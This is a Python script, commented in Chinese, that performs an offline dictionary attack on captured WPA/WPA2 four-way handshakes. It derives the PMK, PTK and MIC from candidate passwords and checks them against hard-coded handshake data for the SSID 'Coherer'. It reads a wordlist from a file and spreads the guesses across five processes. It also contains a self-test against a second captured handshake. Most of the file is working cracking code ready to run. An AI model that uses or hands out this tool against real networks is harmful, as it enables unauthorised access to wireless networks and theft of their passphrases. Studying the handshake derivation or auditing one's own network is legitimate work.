import hmac
import time
from binascii import a2b_hex, b2a_hex
from hashlib import pbkdf2_hmac, sha1, md5
from multiprocessing  import Process,Queue

# PRF函数，用于生成PTK的伪随机函数
# 输入：
# key：  PMK
# A：    b'Pairwise key expansion'（成对密钥扩展）
# B：    apMac、cliMac、aNonce和sNonce拼接而成
# 返回值：
# PTK
def PRF(key, A, B):
    nByte = 64 #PMK长度
    i = 0
    R = b''
    # 迭代生成512位长度PTK
    while (i <= ((nByte * 8 + 159) / 160)):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), sha1)
        R = R + hmacsha1.digest()
        i += 1
    return R[0:nByte]


# MakeAB函数，用于生成生成PTK所需参数
# 输入：
# aNonce：   AP产生的随机数
# bNonce：   STA产生的随机数
# apMac：    AP的MAC地址
# cliMac：   STA的MAC地址
# 返回值：
# A：        b'Pairwise key expansion'（成对密钥扩展）
# B：        apMac、cliMac、aNonce和sNonce拼接而成，具体顺序根据大小而定
def MakeAB(aNonce, sNonce, apMac, cliMac):
    A = b"Pairwise key expansion"
    B = min(apMac, cliMac) + max(apMac, cliMac) + min(aNonce, sNonce) + max(aNonce, sNonce)
    return (A, B)


# MakeMIC函数，用于生成MIC值进行字典攻击
# 输入：
# pwd：      要测试的密码
# ssid：     AP的ssid
# A：        b'Pairwise key expansion'（成对密钥扩展）
# B：        apMac、cliMac、aNonce和sNonce拼接而成
# data：     802.1x帧的数据，其中MIC值部分为0
# wpa：      设定WPA版本，WPA使用md5计算MIC，WPA2使用sha1
# 返回值：
# (mics, ptk, pmk)
def MakeMIC(pwd, ssid, A, B, data, wpa=False):
    pmk = pbkdf2_hmac('sha1', pwd.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    ptk = PRF(pmk, A, B)
    hmacFunc = md5 if wpa else sha1
    mics = [hmac.new(ptk[0:16], i, hmacFunc).digest() for i in data]
    return (mics, ptk, pmk)


# 测试函数，显示PTK、PMK和MICS的值，方便进行检验
def RunTest():
    # 测试密码
    psk = "subnet16121930"
    # ap的ssid
    ssid = "dd-wrt2"
    # AP产生的随机数、STA产生的随机数
    aNonce = a2b_hex('5f5502ba400cd7827ad3db093b855ca0f595f77b1dccc42977e9dea9c2e1d412')
    sNonce = a2b_hex("fd5626a59688a6da5bb338d6595b4995ed9342de1f15be7281b3fee6a8db9130")
    # AP的MAC地址、STA的MAC地址
    apMac = a2b_hex("0018f8f5c2c6")
    cliMac = a2b_hex("00259c749592")
    # 抓包得到的mic值和wpa协议数据，其中wpa协议数据的mic值部分全部替换为0，1、2、3分别对应第2、3、4个包
    mic1 = "7bdd55553f0bd9ad4c78112200e4486b"
    data1 = a2b_hex(
        "0103007502010a00000000000000000001fd5626a59688a6da5bb338d6595b4995ed9342de1f15be7281b3fee6a8db9130000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000")
    mic2 = "e60f0dfe5ea596c513f92a24961efe75"
    data2 = a2b_hex(
        "010300af0213ca001000000000000000025f5502ba400cd7827ad3db093b855ca0f595f77b1dccc42977e9dea9c2e1d412520ddd5be7ecc1ecb026276e0e41aaeafc0000000000000000000000000000000000000000000000000000000000000000502c8d27f09d60467190ac5f9ce0069669b3f7ad5eb4be68f27481dec2e688d1541a1c28256f373208482711afdd931a44eb66fac73881267af8d345f07d63e16d33a6c56e35d26e98432997bc4a87faa2")
    mic3 = "f2be18f46a6903a554c002ce4dd7eb54"
    data3 = a2b_hex(
        "0103005f02030a0000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
    mics, ptk, pmk = MakeMIC(psk, ssid, A, B, [data1, data2, data3])
    # 打印计算结果
    pmkStr = b2a_hex(pmk).decode().upper()
    print("pmk:" + pmkStr + '\n')
    ptkStr = b2a_hex(ptk).decode().upper()
    print("ptk:" + ptkStr + '\n')
    mic1Str = mic1.upper()
    print("计算 mic:\t" + mic1Str)
    micStr = b2a_hex(mics[0]).decode().upper()[:-8]
    print("实际 mic:\t" + micStr)
    print('匹配\n' if micStr == mic1Str else '不匹配\n')
    mic2Str = mic2.upper()
    print("计算 mic:\t" + mic2Str)
    micStr = b2a_hex(mics[1]).decode().upper()[:-8]
    print("实际 mic:\t" + micStr)
    print('匹配\n' if micStr == mic2Str else '不匹配\n')
    mic3Str = mic3.upper()
    print("计算 mic:\t" + mic3Str)
    micStr = b2a_hex(mics[2]).decode().upper()[:-8]
    print("实际 mic:\t" + micStr)
    print('匹配\n' if micStr == mic3Str else '不匹配\n')
    return



# TestPwds函数，用于测试密码列表，如果找到正确的就打印到屏幕上
# 输入：
# S:         密码列表
# ssid:      AP的SSID
# aNonce:    AP产生的随机数
# sNonce:    STA产生的随机数
# apMac:     AP的MAC地址
# cliMac:    STA的MAC地址
# data:      第二个握手包的数据，其中MIC值部分改为0
# data2:     第三个握手包的数据，其中MIC值部分改为0
# data3:     第四个握手包的数据，其中MIC值部分改为0
# targMic:   第二个握手包的MIC值
# targMic2:  第三个握手包的MIC值
# targMic3:  第四个握手包的MIC值
# end:       多进程通信的消息队列
def TestPwds(S1, ssid, aNonce, sNonce, apMac, cliMac, data, data2, data3, targMic, targMic2, targMic3, end):
    A, B = MakeAB(aNonce, sNonce, apMac, cliMac)
    a = 0  # 统计计算过的密码数量
    for i in S1:
        mic, _, _ = MakeMIC(i, ssid, A, B, [data])
        v = b2a_hex(mic[0]).decode()[:-8]
        a = a + 1
        if (a % 1000==0): # 进度统计
            end.put(1000)
        if (v != targMic):
            continue
        mic2, _, _ = MakeMIC(i, ssid, A, B, [data2])
        v2 = b2a_hex(mic2[0]).decode()[:-8]
        if (v2 != targMic2):
            continue
        mic3, _, _ = MakeMIC(i, ssid, A, B, [data3])
        v3 = b2a_hex(mic3[0]).decode()[:-8]
        if (v3 != targMic3):
            continue
        #  找到密码
        print('!!!发现密码!!!')
        print('密码:' + i)
        end.put(1)# 1表示线程成功找到密码
        return
    end.put(0)  # 0表示线程执行结束未发现密码
    return None

if __name__ == "__main__":
    # RunTest() #测试函数
    # AP的ssid
    ssid = "Coherer"
    # AP产生的随机数
    aNonce = a2b_hex('3e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933')
    # STA产生的随机数
    sNonce = a2b_hex("cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386")
    # AP的MAC
    apMac = a2b_hex("000c4182b255")
    # STA的MAC
    cliMac = a2b_hex("000d9382363a")
    # 第二个握手包的MIC值
    mic1 = "a462a7029ad5ba30b6af0df391988e45"
    # 第二个握手包的数据，其中MIC值部分改为0（注意数据只是802.1x帧的部分）
    data1 = a2b_hex(
        "0203007502010a00100000000000000000cdf405ceb9d889ef3dec42609828fae546b7add7baecbb1a394eac5214b1d386000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac020100000fac040100000fac020000")
    # 第三个握手包的MIC值
    mic2 = "7d0af6df51e99cde7a187453f0f93537"
    # 第三个握手包的数据，其中MIC值部分改为0
    data2 = a2b_hex(
        "020300af0213ca001000000000000000013e8e967dacd960324cac5b6aa721235bf57b949771c867989f49d04ed47c6933f57b949771c867989f49d04ed47c6934cf020000000000000000000000000000000000000000000000000000000000000050cfa72cde35b2c1e2319255806ab364179fd9673041b9a5939fa1a2010d2ac794e25168055f794ddc1fdfae3521f4446bfd11da98345f543df6ce199df8fe48f8cdd17adca87bf45711183c496d41aa0c")
    # 第四个握手包的MIC值
    mic3 = "10bba3bdfbcfde2bc537509d71f2ecd1"
    # 第四个握手包的数据，其中MIC值部分改为0
    data3 = a2b_hex(
        "0203005f02030a0010000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")
    # 打开字典读取密码列表
    with open('test.txt') as f:
        S=[]
        for l in f:
            S.append(l.strip())
    # 分片密码列表，多线程执行
    pian = 5  # 进程数量，视cpu性能修改
    H = [[0] for i in range(pian)]
    for x in range(pian):
        H[x] = S[( x * len(S) // pian):(len(S)+ (x*len(S)) ) // pian ]
    for x in range(pian):
        print("第"+ str(x+1)+"进程密码数量："+str(len(H[x])))
    process = []
    end= Queue()
    for x in range(pian):
        p = Process(target=TestPwds,
                     args=(H[x], ssid, aNonce, sNonce, apMac, cliMac, data1, data2, data3, mic1, mic2, mic3, end))
        p.daemon = True
        process.append(p)
    for x in range(pian):
        process[x].start()

    # 输出进度，执行结果
    number=0 # 统计进度
    endpr=pian # 统计执行完毕线程数量
    try:
        while 1:
            time.sleep(1)  # 减少性能消耗
            if not (end.empty()):
                str = end.get()
                if (str == 1):
                    exit()
                if (str == 0):
                    endpr = endpr - 1
                    if (endpr == 0):
                        print("未发现密码")
                        exit()
                if (str == 1000):
                    number = number + 1000
                print('进度： %.2f' % (number / len(S) * 100) + "%")
    except:
        exit()

